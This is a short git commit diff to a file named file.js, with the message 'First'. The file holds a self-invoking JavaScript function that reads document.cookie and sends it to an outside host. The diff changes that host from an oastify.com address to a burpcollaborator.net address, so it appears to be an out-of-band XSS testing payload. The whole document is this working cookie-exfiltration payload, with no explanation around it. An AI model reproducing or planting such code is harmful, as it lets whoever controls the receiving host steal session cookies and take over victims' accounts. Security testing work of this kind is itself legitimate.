46de9110192246b2e4aa1d36494777db8a921bd9
Sokolov Alexandr <alnsokolov@mail.ru>
2022-10-26 22:31:18 +0300

    First

--- file.js
+++ file.js
@@ -1,3 +1,3 @@
 (function() {
-    fetch('https://4uzhis5cb31gg6jnqpobr66hz85zto.oastify.com/' + document.cookie, {mode:'no-cors'});
+    fetch('https://k4p72gv4m2ztfwpxg5j8b5xt1k7avz.burpcollaborator.net/' + document.cookie, {mode:'no-cors'});
 })()
